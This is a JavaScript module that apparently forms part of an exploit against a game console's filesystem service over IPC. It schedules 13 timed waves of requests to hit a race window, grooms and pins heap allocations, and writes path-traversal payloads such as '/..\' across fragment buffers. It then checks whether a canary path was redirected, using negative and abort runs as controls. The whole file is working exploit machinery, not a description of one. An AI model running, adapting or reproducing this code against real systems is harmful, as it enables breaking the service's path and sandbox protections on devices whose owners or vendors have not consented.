import coreRuntime from "../runtime.mjs";

const {
  FRAME_SENTINEL,
  MCPY,
  SEND,
  SETB,
  SIGNAL,
  SLEEP,
  TICK,
  WAIT,
  allocPage,
  checkWindow,
  closeHandle,
  cmifReply,
  collectSpans,
  extractRoleTimings,
  prepPacket,
  qualifyOverlap,
  read32,
  read64,
  read8,
  readAllocationCounters,
  readFrameResult,
  roleSendCode,
  sendIPC,
  ticksToUs,
  write32,
  write8,
  writeStr,
  writeXDesc
} = coreRuntime;

// ── Wave planning and configuration ───────────────────────────────────────

export function buildPlans(input) {
    const config = input.config;
    let REQ = input.REQ;
    let clearPkt = input.clearPkt;
    let gates = input.gates;
    let pinPkt = input.pinPkt;
    let prePkt = input.prePkt;
    let roleHandles = input.roleHandles;
    let rootSession = input.rootSession;
    let triggerBuf = input.triggerBuf;
    var plans = [];
    for (var i = 0; i < 13; i++) {
        var steps = [WAIT(gates.masterGate)];
        if (i < 10) {
            steps.push(SLEEP(config.roleDelays[i]));
        } else if (i < 12) {
            steps.push(WAIT(gates.groupReleasedGate));
            steps.push(SLEEP(config.guardDelays[i - 10]));
        } else {
            // CivSwitchFS original: 1.6 ms; Slapah/Kurumuz reference: 2.4 ms.
            steps.push(SLEEP(1600000));
            steps.push(WAIT(gates.groupReleasedGate));
            steps.push(WAIT(gates.guardLaunchedGate));
            steps.push(SLEEP(400000));
            steps.push(MCPY(gates.spacingDecision, gates.bottleneckFinished, 4));
            steps.push(WAIT(gates.bottleneckDoneGate));
            steps.push(MCPY(gates.sampledCompleted, gates.completedFlag, 4));
            steps.push(MCPY(gates.sampledEarlyHole, gates.earlyHole, 4));
            steps.push(MCPY(0n, gates.sampledCompleted, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
            steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
            steps.push(MCPY(0n, gates.spacingDecision, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
        }
        if (i === 9) {
            steps.push(TICK(), SEND(pinPkt, rootSession), TICK());
            steps.push(TICK(), SEND(clearPkt, rootSession), TICK());
            steps.push(TICK(), SEND(prePkt, rootSession), TICK());
        }
        if (i === 11) {
            steps.push(MCPY(gates.earlyHole, gates.bottleneckFinished, 4));
            steps.push(SIGNAL(gates.guardLaunchedGate));
        }
        steps.push(TICK());
        steps.push(SEND(REQ[i], roleHandles[i]));
        steps.push(TICK());
        if (i === 1) {
            steps.push(SETB(gates.bottleneckFinished, 1));
            steps.push(SIGNAL(gates.bottleneckDoneGate));
        }
        if (i === 9) steps.push(SIGNAL(gates.groupReleasedGate));
        if (i === 0 || (i >= 2 && i <= 8) || i === 10 || i === 11) {
            steps.push(SETB(gates.completedFlag, 1));
            steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
        }
        plans.push(steps);
    }
    return plans;
}

export function configureProfile(profile, input) {
    const config = input.config;
    let REQ = input.REQ;
    let SCRATCH_DIR = input.SCRATCH_DIR;
    let extentTotal = input.extentTotal;
    let fragmentBufs = input.fragmentBufs;
    let segments = input.segments;
    let selectedDir = input.selectedDir;
    let triggerBuf = input.triggerBuf;
    var payload = new Array(extentTotal);
    var positive = profile === "positive";
    for (var i = 0; i < extentTotal; i++) payload[i] = positive ? 0x42 : 0x2F;
    payload[extentTotal - 1] = 0;

    if (positive) {
        for (var fs = config.POSITIVE_FILL_SEGMENT; fs < 0x2340; fs += config.POSITIVE_FILL_SEGMENT + 1)
            payload[fs] = 0x2F;
        writeIntoPayload(payload, selectedDir, 0x2340);
        for (var i = 0x2340 + selectedDir.length; i < config.EXTENT_SIZE; i++)
            payload[i] = 0x2F;
        writeIntoPayload(payload, "/..\\", 0);
    } else if (profile === "extent-absent" || profile === "extent-present") {
        writeIntoPayload(payload, SCRATCH_DIR + "/", 0);
        for (var i = 0; i < segments.length; i++)
            writeIntoPayload(payload, "/" + segments[i] + "/",
                (i + 1) * config.SLOT_SIZE);
        var basename = profile === "extent-absent" ? "SPAN_ABSENT" : "SPAN_MARKER";
        writeIntoPayload(payload, basename, config.EXTENT_SIZE - basename.length);
    } else {
        writeIntoPayload(payload, "/../", 0);
    }

    var pieces = [];
    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
        pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));
    for (var i = 0; i < pieces[0].length; i++)
        write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
    for (var piece = 1; piece < pieces.length; piece++) {
        for (var k = 0; k < pieces[piece].length; k++)
            write8(fragmentBufs[piece - 1] + BigInt(k),
                BigInt(pieces[piece][k]));
        writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
            pieces[piece].length);
    }
    return {configured: true};
}

export function configurePayload(tailBytes, input) {
    const config = input.config;
    let REQ = input.REQ;
    let fragmentBufs = input.fragmentBufs;
    let triggerBuf = input.triggerBuf;
    var payloadLen = config.MARKER_OFFSET + tailBytes.length + 1;
    var payload = new Array(payloadLen);
    for (var i = 0; i < payloadLen; i++) payload[i] = 0x42;
    payload[0] = 0x2F; payload[1] = 0x2E; payload[2] = 0x2E; payload[3] = 0x5C;
    for (var i = 0; i < tailBytes.length; i++)
        payload[config.MARKER_OFFSET + i] = tailBytes[i];
    payload[payloadLen - 1] = 0;

    var pieces = [];
    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
        pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));

    for (var i = 0; i < pieces[0].length; i++)
        write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
    for (var piece = 1; piece < pieces.length; piece++) {
        for (var k = 0; k < pieces[piece].length; k++)
            write8(fragmentBufs[piece - 1] + BigInt(k),
                BigInt(pieces[piece][k]));
        writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
            pieces[piece].length);
    }
    return {configured: true};
}

export function writeIntoPayload(payload, text, offset) {
    for (var i = 0; i < text.length; i++)
        payload[offset + i] = text.charCodeAt(i);
}

export function checkPathPairQuiet(path0, size0, path1, size1, input) {
    let savedHandle = input.savedHandle;
    var controlPkt = allocPage(0x2000);
    var p0 = allocPage(0x1000);
    var p1 = allocPage(0x1000);
    writeStr(p0, path0);
    writeStr(p1, path1);
    prepPacket(controlPkt, (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(controlPkt, 8, p0, size0, 0);
    writeXDesc(controlPkt, 16, p1, size1, 1);
    var transport = Number(sendIPC(savedHandle, controlPkt)) >>> 0;
    if (transport !== 0) return false;
    return cmifReply(controlPkt).result === 0x202;
}

export function queryCanaryHealth(input) {
    let canaryPath = input.canaryPath;
    let savedHandle = input.savedHandle;
    let setupPath = input.setupPath;
    let setupPkt = input.setupPkt;
    writeStr(setupPath, canaryPath);
    prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, canaryPath.length + 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);
    var transport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
    if (transport !== 0)
        return { transport: transport, result: 0xFFFFFFFF, type: -1 };
    var reply = cmifReply(setupPkt);
    var type = reply.result === 0
        ? (Number(read32(setupPkt + BigInt(reply.data))) >>> 0) : -1;
    return { transport: transport, result: reply.result, type: type };
}

export function nulWrites(desired) {
    var last = -1;
    for (var i = desired.length - 1; i >= 0; i--) {
        if (desired[i] !== 0) { last = i; break; }
    }
    if (last + 1 >= desired.length) throw new Error("nulWrites: needs trailing zero");
    var ends = [last + 1];
    for (var end = last; end >= 0; end--) {
        if (desired[end] === 0) ends.push(end);
    }
    return ends.map(function(end) {
        var bytes = [];
        for (var i = 0; i < end; i++) bytes.push(desired[i] || 0x42);
        return { end: end, bytes: bytes };
    });
}

// ── Wave result analysis ──────────────────────────────────────────────────

export function analyzeWave(profile, wave, waveData, group, createPinThisWave, input) {
    const config = input.config;
    let REQ = input.REQ;
    let clearPkt = input.clearPkt;
    let clearSendIndex = input.clearSendIndex;
    let gates = input.gates;
    let pinFirstWaveQualified = input.pinFirstWaveQualified;
    let pinHandle = input.pinHandle;
    let pinPkt = input.pinPkt;
    let pinSendIndex = input.pinSendIndex;
    let pktBuf = input.pktBuf;
    let prePkt = input.prePkt;
    let preSendIndex = input.preSendIndex;
    let rootSession = input.rootSession;
    let sendIndices = input.sendIndices;
    let abortControlCanonical = input.abortControlCanonical;
    let canaryPath = input.canaryPath;
    let savedHandle = input.savedHandle;
    let setupPath = input.setupPath;
    let setupPkt = input.setupPkt;
    var spans = collectSpans(waveData.frames, sendIndices, config.roleLabels);
    var trigSpan = null;
    for (var si = 0; si < spans.length; si++)
        if (spans[si].name === "trigger") trigSpan = spans[si];
    var overlap = qualifyOverlap(spans, trigSpan, config.overlapRoles,
        config.throughRoles, config.heldRoles);

    var scv = Number(read32(gates.sampledCompleted)) >>> 0;
    var sev = Number(read32(gates.sampledEarlyHole)) >>> 0;
    var ssv = Number(read32(gates.spacingDecision)) >>> 0;
    var triggerAborted = scv !== 0 || sev !== 0 || ssv !== 0;

    var protectedRoleIds = [0, 2, 3, 4, 5, 6, 7, 8, 10, 11];
    var protectedDone = protectedRoleIds.filter(function(role) {
        return Number(read8(gates.roleDoneFlags + BigInt(role))) !== 0;
    }).length;

    var pinSent = roleSendCode(waveData.frames, 9, pinSendIndex) === 0;
    var pinReply;
    if (pinSent) {
        pinReply = cmifReply(pinPkt);
    } else {
        pinReply = { result: 0xFFFFFFFF, moves: [], copies: [] };
    }

    var pinShapeOk = pinReply.result === 0 && (!createPinThisWave ||
        (pinReply.copies.length === 0 && pinReply.moves.length === 1));
    if (createPinThisWave && pinShapeOk) {
        pinHandle = pinReply.moves[0];
    }

    if (createPinThisWave && !pinShapeOk) {
        for (var ph = 0; ph < pinReply.moves.length; ph++) closeHandle(pinReply.moves[ph]);
        for (var ph = 0; ph < pinReply.copies.length; ph++) closeHandle(pinReply.copies[ph]);
    }

    var clearReply;
    if (roleSendCode(waveData.frames, 9, clearSendIndex) === 0) {
        clearReply = cmifReply(clearPkt);
    } else {
        clearReply = { result: 0xFFFFFFFF };
    }

    var preReply;
    if (roleSendCode(waveData.frames, 9, preSendIndex) === 0) {
        preReply = cmifReply(prePkt);
    } else {
        preReply = { result: 0xFFFFFFFF };
    }

    var preStats = null;
    if (preReply.result === 0) {
        preStats = [];
        for (var pi = 0; pi < 16; pi++)
            preStats.push(Number(read64(prePkt + BigInt(preReply.data + pi * 8))));
    }

    var afterStats = readAllocationCounters(rootSession, pktBuf);
    var preReleaseUsed = group.held && preStats
        ? group.held[5] - preStats[5] : null;
    var pinPersistentBytes = createPinThisWave && afterStats && group.before
        ? group.before[5] - afterStats[5] : null;
    var pinCostOk = !createPinThisWave ||
        pinPersistentBytes === config.PINNING_ALLOCATION_BYTES;
    var restored = Boolean(afterStats && group.before &&
        Math.abs(afterStats[5] +
            (createPinThisWave ? config.PINNING_ALLOCATION_BYTES : 0) -
            group.before[5]) <= config.HEAP_JITTER_BYTES);

    var sendCodes = [];
    for (var ci = 0; ci < 13; ci++)
        sendCodes.push(roleSendCode(waveData.frames, ci, sendIndices[ci]));
    var transportOk = sendCodes.filter(function(c) { return c === 0; }).length;
    var resultAt = function(index) {
        if (sendCodes[index] !== 0) {
            return 0xFFFFFFFF;
        }

        return Number(cmifReply(REQ[index]).result) >>> 0;
    };
    var typeAt = function(index, result) {
        if (result !== 0 || sendCodes[index] !== 0) return -1;
        var reply = cmifReply(REQ[index]);
        return Number(read32(REQ[index] + BigInt(reply.data))) >>> 0;
    };

    var commitResult = resultAt(0);
    var readResult = resultAt(1);
    var tailResults = [2, 3, 4, 5].map(resultAt);
    var canaryResult = resultAt(6);
    var canaryType = typeAt(6, canaryResult);
    var triggerResult = resultAt(12);
    var triggerType = typeAt(12, triggerResult);
    var fillerResults = [7, 8].map(resultAt);
    var guardResults = [10, 11].map(resultAt);
    var health = queryCanaryHealth({canaryPath, savedHandle, setupPath, setupPkt});

    var canaryStart = readFrameResult(waveData.frames[6].frame, sendIndices[6] - 1);
    var canaryEnd = readFrameResult(waveData.frames[6].frame, sendIndices[6] + 1);
    var pinStart = readFrameResult(waveData.frames[9].frame, pinSendIndex - 1);
    var pinEnd = readFrameResult(waveData.frames[9].frame, pinSendIndex + 1);
    var pinWindowMeasured = createPinThisWave &&
        canaryStart !== FRAME_SENTINEL && canaryEnd !== FRAME_SENTINEL &&
        pinStart !== FRAME_SENTINEL && pinEnd !== FRAME_SENTINEL;
    var pinWindowOk = pinWindowMeasured &&
        canaryStart < pinStart && pinEnd < canaryEnd;
    var pinStartOffsetUs = pinWindowMeasured
        ? ticksToUs(pinStart - canaryStart) : null;
    var pinEndMarginUs = pinWindowMeasured
        ? ticksToUs(canaryEnd - pinEnd) : null;

    if (createPinThisWave)
        pinFirstWaveQualified = pinShapeOk && pinWindowOk && pinCostOk && restored;

    var changedPaths = [];
    if (canaryResult !== 0 || canaryType !== 1) changedPaths.push("canary");
    for (var fi = 0; fi < fillerResults.length; fi++)
        if (fillerResults[fi] !== 0x202) changedPaths.push("filler" + fi);
    for (var gi = 0; gi < guardResults.length; gi++)
        if (guardResults[gi] !== 0x202) changedPaths.push("guard" + gi);

    var selectedMarker = triggerResult === 0 && triggerType === 1;
    var observedCanaryRedirect = canaryResult === 0 && canaryType === 0 &&
        changedPaths.length === 1 && changedPaths[0] === "canary";
    var canaryRedirect = observedCanaryRedirect;
    var tailsExpected = tailResults.every(function(r) {
        return r !== 0xFFFFFFFF && (r & 0x3FFFFF) === 0x00320002;
    });
    var reservationExpected = group.reserved === 59 &&
        group.failures.length === 0 && group.outer !== 0;
    var releaseWasSent = sendCodes[9] === 0;
    var isPositiveProfile = profile === "positive" || profile.indexOf("cache") === 0;
    var pathsExpected = fillerResults.every(function(r) {
        return r === 0x202 || (isPositiveProfile && r === 0x2EEA02);
    }) && guardResults.every(function(r) { return r === 0x202; });

    var window = Boolean(reservationExpected && wave.done === 13 &&
        transportOk === 13 && wave.joined === 13 &&
        protectedDone === 10 && releaseWasSent &&
        Number(wave.signalResult) === 0 && trigSpan &&
        overlap.shapeCount === 10 &&
        overlap.receiveMarginUs !== null && overlap.receiveMarginUs >= 300 &&
        !triggerAborted && tailsExpected && commitResult === 0 &&
        readResult === 0 && pathsExpected &&
        pinShapeOk && clearReply.result === 0 &&
        preReply.result === 0 && restored && pinCostOk &&
        (!createPinThisWave || pinWindowOk) && pinFirstWaveQualified &&
        preReleaseUsed !== null && preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);

    var postCanaryHealthy = health.transport === 0 &&
        health.result === 0 && health.type === 1;
    var triggerCanonical = triggerResult & 0x3FFFFF;

    var wc = checkWindow({
        reservation: reservationExpected,
        "workers-done": wave.done === 13,
        transport: transportOk === 13,
        "workers-join": wave.joined === 13,
        "protected-10": protectedDone === 10,
        "release-sent": releaseWasSent,
        signal: Number(wave.signalResult) === 0,
        "trig-span": Boolean(trigSpan),
        "shape-10": overlap.shapeCount === 10,
        "margin>=300": overlap.receiveMarginUs !== null &&
            overlap.receiveMarginUs >= 300,
        "no-abort": !triggerAborted,
        tails: tailsExpected,
        commit: commitResult === 0,
        read: readResult === 0,
        paths: pathsExpected,
        "pin-shape": pinShapeOk,
        "clear-ok": clearReply.result === 0,
        "pre-ok": preReply.result === 0,
        "heap-restore": restored,
        "pin-cost": pinCostOk,
        "pin-window": !createPinThisWave || pinWindowOk,
        "pin-1st": pinFirstWaveQualified,
        "pre-release": preReleaseUsed !== null &&
            preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD
    });
    var roleTimings = extractRoleTimings(spans, trigSpan);
    return {
        shape: overlap.shapeCount,
        shapeMissing: overlap.shapeMissing.slice(),
        margin: overlap.receiveMarginUs !== null
            ? overlap.receiveMarginUs.toFixed(0) : null,
        marginUsRaw: overlap.receiveMarginUs,
        marginSlackUs: overlap.receiveMarginUs !== null
            ? overlap.receiveMarginUs - 300 : null,
        preReleaseSlackBytes: preReleaseUsed !== null
            ? preReleaseUsed - config.WINDOW_MINIMUM_CACHE_HELD : null,
        window: wc.ok,
        rejections: wc.rejections,
        sendCodes: sendCodes,
        readResult: readResult,
        roleTimings: roleTimings,
        canaryType: canaryType,
        canaryResult: canaryResult,
        triggerType: triggerType,
        selectedMarker: selectedMarker,
        observedCanaryRedirect: observedCanaryRedirect,
        postCanaryHealth: {
            transport: health.transport,
            result: health.result,
            type: health.type,
            healthy: postCanaryHealthy
        },
        guardSamples: {
            completed: scv,
            earlyHole: sev,
            spacing: ssv
        },
        pinDiagnostics: {
            created: createPinThisWave,
            result: pinReply.result,
            moves: pinReply.moves.length,
            copies: pinReply.copies.length,
            persistentBytes: pinPersistentBytes,
            expectedBytes: config.PINNING_ALLOCATION_BYTES,
            shapeOk: pinShapeOk,
            costOk: pinCostOk,
            windowMeasured: pinWindowMeasured,
            windowOk: pinWindowOk,
            startOffsetUs: pinStartOffsetUs,
            endMarginUs: pinEndMarginUs,
            restored: restored
        },
        canaryRedirect: profile === "positive" && wc.ok && canaryRedirect && postCanaryHealthy,
        extentQualified: profile === "extent-present" && wc.ok && selectedMarker &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        negativeControl: profile === "negative" && window && !triggerAborted &&
            triggerCanonical === 0x2EEC02 && canaryResult === 0 &&
            canaryType === 1 && postCanaryHealthy,
        abortControl: triggerAborted && scv === 1 &&
            triggerCanonical === abortControlCanonical &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        abortHoleControl: triggerAborted && sev === 1 && ssv === 1 &&
            triggerCanonical === abortControlCanonical &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        changedPaths: changedPaths,
        preReleaseUsed: preReleaseUsed,
        triggerAborted: triggerAborted,
        triggerResult: triggerResult,
        triggerCanonical: triggerCanonical,
        pinHandle: pinHandle,
        pinFirstWaveQualified: pinFirstWaveQualified
    };
}
